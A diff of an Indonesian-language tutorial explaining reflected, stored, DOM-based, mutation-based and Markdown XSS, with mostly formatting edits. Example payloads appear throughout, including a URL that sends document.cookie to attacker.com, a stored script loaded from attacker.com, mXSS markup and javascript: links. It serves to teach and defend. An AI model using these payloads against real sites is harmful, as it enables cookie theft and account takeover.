@@ -17,9 +17,9 @@ Meskipun prinsip dasarnya sama—yaitu mengeksekusi skrip ilegal di browser korb
 Reflected XSS terjadi ketika aplikasi web menerima data dari permintaan HTTP (seperti parameter URL atau kolom input formulir) dan langsung memantulkannya kembali ke dalam respons HTML tanpa proses validasi atau *output encoding* yang memadai.
 
 * **Cara Kerja:** Penyerang membuat tautan khusus yang menyematkan muatan berbahaya di parameternya, misalnya:
+
 ```text
 https://example.com/search?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
-
 ```
 
 Jika server langsung menampilkan isi query tersebut ke halaman hasil pencarian (misalnya: `Menampilkan hasil untuk: <script>...`), browser korban akan langsung mengeksekusinya begitu tautan dibuka.
@@ -30,11 +30,10 @@ Jika server langsung menampilkan isi query tersebut ke halaman hasil pencarian (
 Stored XSS adalah varian yang jauh lebih destruktif dibandingkan Reflected XSS. Pada jenis ini, muatan berbahaya berhasil disimpan secara permanen di basis data atau media penyimpanan server web.
 
 * **Cara Kerja:** Penyerang menyisipkan muatan melalui fitur interaktif yang menyimpan data publik, seperti kolom komentar blog, pesan forum, atau kolom profil pengguna.
+
 ```html
 Halo semua! <script src="https://attacker.com/payload.js"></script>
-
 ```
-
 
 * **Karakteristik:** Begitu muatan tersimpan di database, setiap pengguna biasa maupun administrator yang mengunjungi halaman tersebut secara otomatis akan mengeksekusi skrip berbahaya tanpa perlu mengeklik tautan jebakan apa pun.
 
@@ -44,12 +43,11 @@ Berbeda dengan Reflected dan Stored XSS yang melibatkan pemrosesan di sisi serve
 
 * **Cara Kerja:** Kerentanan ini berakar pada interaksi antara **Source** (sumber input tak tepercaya di browser, seperti `location.hash`, `location.search`, atau `document.referrer`) dan **Sink** (fungsi atau properti DOM berbahaya yang mengeksekusi kode, seperti `element.innerHTML`, `document.write()`, atau `eval()`).
 * **Contoh Skenario:** Skrip front-end membaca nilai hash URL dan langsung merendernya:
+
 ```javascript
 const target = decodeURIComponent(location.hash.substring(1));
 document.getElementById("greeting").innerHTML = "Halo, " + target;
-
 ```
-
 
 Jika penyerang mengarahkan pengguna ke `[https://example.com/#](https://example.com/#)<img src=x onerror=alert(1)>`, browser mengeksekusi skrip secara lokal di DOM tanpa mengirim fragmen hash `#` ke server.
 
@@ -59,11 +57,10 @@ Mutation-based XSS merupakan jenis XSS tingkat lanjut yang mengeksploitasi perbe
 
 * **Cara Kerja:** Ketika sebuah aplikasi menggunakan sanitizer untuk membersihkan input pengguna, sanitizer mungkin menganggap sebuah string HTML "aman". Namun, saat string tersebut dimasukkan ke dalam DOM menggunakan properti seperti `innerHTML`, engine browser memutasi atau menyusun ulang (*re-serializing*) kode HTML tersebut agar valid secara sintaksis.
 * **Contoh Skenario:** Browser modern mendukung beberapa *namespace* (seperti HTML5, SVG, dan MathML). Struktur bersarang yang aneh dapat mengubah konteks parsing saat dimutasi oleh browser:
+
 ```html
 <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
-
 ```
-
 
 Proses normalisasi browser secara otomatis "memperbaiki" tag yang rusak atau tidak tertutup dengan benar. Perbaikan internal ini dapat memunculkan kembali elemen eksekusi yang sebelumnya tersembunyi atau lolos dari pemeriksaan sanitizer.
 
@@ -74,20 +71,18 @@ Banyak aplikasi modern (platform pengembang, forum teknis, CMS, atau aplikasi pe
 **Penyebab Utama:**
 * **Dukungan Raw HTML:** Spesifikasi Markdown standar mengizinkan elemen raw HTML. Jika parser Markdown tidak menonaktifkan atau memfilter tag HTML mentah, muatan seperti `<img src=x onerror=alert(1)>` akan langsung masuk ke hasil render.
 * **Penyalahgunaan Skema URI:** Tautan Markdown dapat dimanipulasi menggunakan skema protokol berbahaya:
-```markdown
-[Klik tautan ini untuk hadiah](javascript:alert(XSS))
 
+```
+[Klik tautan ini untuk hadiah](javascript:alert(XSS))
 ```
 
 atau:
-```markdown
+
+```
 ![image](javascript:alert('XSS'))
 ```
 
-
 * **Kerentanan Parser:** Beberapa parser Markdown populer memiliki bug pada ekspresi reguler (*regex*) atau *AST walker* yang memungkinkan penyerang menyisipkan karakter lolos (*escape bypass*) sebelum dikonversi menjadi elemen HTML.
-
-
 
 ## Perbandingan Karakteristik
 
